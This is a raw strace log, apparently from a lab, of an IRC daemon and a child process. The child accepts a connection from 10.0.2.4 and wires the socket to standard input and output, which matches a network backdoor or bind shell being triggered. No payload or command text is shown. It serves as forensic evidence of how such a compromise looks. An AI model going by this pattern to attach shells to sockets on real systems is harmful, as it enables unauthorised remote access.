4519  07:23:23.072102 time(NULL)        = 1495625003
4519  07:23:23.072123 open("ircd.tune", O_WRONLY|O_CREAT|O_TRUNC, 0666) = 6
4519  07:23:23.072163 fstat64(6, {st_mode=S_IFREG|0600, st_size=0, ...}) = 0
4519  07:23:23.072182 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7f32000
4519  07:23:23.072198 write(6, "0\n5\n", 4) = 4
4519  07:23:23.072212 close(6)          = 0
4519  07:23:23.072223 munmap(0xb7f32000, 4096) = 0
4519  07:23:23.072239 gettimeofday({1495625003, 72243}, NULL) = 0
4519  07:23:23.072252 select(1024, [2], [], NULL, {0, 0}) = 0 (Timeout)
4519  07:23:23.072281 clock_gettime(CLOCK_MONOTONIC, {1812, 889293579}) = 0
4519  07:23:23.072291 gettimeofday({1495625003, 72295}, NULL) = 0
4519  07:23:23.072302 select(1024, [2 3 4 5 7 9], [], NULL, {1, 0} <unfinished ...>
8424  07:23:23.277482 <... accept resumed> {sa_family=AF_INET, sin_port=htons(32869), sin_addr=inet_addr("10.0.2.4")}, [16]) = 8
8424  07:23:23.277601 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc59de8) = -1 EINVAL (Invalid argument)
8424  07:23:23.277653 _llseek(8, 0, 0xbfc59e30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:23.277679 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc59de8) = -1 EINVAL (Invalid argument)
8424  07:23:23.277723 _llseek(8, 0, 0xbfc59e30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:23.277733 fcntl64(8, F_SETFD, FD_CLOEXEC) = 0
8424  07:23:23.277859 close(6)          = 0
8424  07:23:23.278061 dup(8)            = 6
8424  07:23:23.278090 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5ac88) = -1 EINVAL (Invalid argument)
8424  07:23:23.278103 _llseek(6, 0, 0xbfc5acd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:23.278114 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
8424  07:23:23.278135 dup2(6, 1)        = 1
8424  07:23:23.278147 close(6)          = 0
8424  07:23:23.278172 fcntl64(1, F_SETFD, 0) = 0
8424  07:23:23.278182 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5ac58) = -1 EINVAL (Invalid argument)
8424  07:23:23.278193 _llseek(1, 0, 0xbfc5aca0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:23.278224 dup(8)            = 6
8424  07:23:23.278236 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfc5ac88) = -1 EINVAL (Invalid argument)
8424  07:23:23.278246 _llseek(6, 0, 0xbfc5acd0, SEEK_CUR) = -1 ESPIPE (Illegal seek)
8424  07:23:23.278256 fstat64(6, {st_mode=S_IFSOCK|0777, st_size=0, ...}) = 0
8424  07:23:23.278273 dup2(6, 0)        = 0
8424  07:23:23.278283 close(6)          = 0
8424  07:23:23.278292 fcntl64(0, F_SETFD, 0) = 0
8424  07:23:23.278325 fcntl64(0, F_SETFD, 0) = 0
8424  07:23:23.278342 read(0,  <unfinished ...>
4519  07:23:23.290931 <... select resumed> ) = 1 (in [5], left {0, 780000})
4519  07:23:23.290931 clock_gettime(CLOCK_MONOTONIC, {1813, 107940206}) = 0
4519  07:23:23.290931 recv(5, 0x80b7ec0, 8192, 0) = -1 ECONNRESET (Connection reset by peer)
4519  07:23:23.290932 getsockopt(5, SOL_SOCKET, SO_ERROR, [0], [4]) = 0
4519  07:23:23.290932 send(5, "ERROR :Closing Link: [10.0.2.4] (Connection reset by peer)\r\n", 60, 0) = -1 EPIPE (Broken pipe)
4519  07:23:23.290932 --- SIGPIPE (Broken pipe) @ 0 (0) ---
4519  07:23:23.290935 close(5)          = 0
4519  07:23:23.290949 gettimeofday({1495625003, 290953}, NULL) = 0
4519  07:23:23.290961 select(1024, [2 3 4 7 9], [], NULL, {1, 0} <unfinished ...>
8424  07:23:23.798957 <... read resumed> "", 4096) = 0
8424  07:23:23.799091 close(8)          = 0
8424  07:23:23.799249 exit_group(0)     = ?
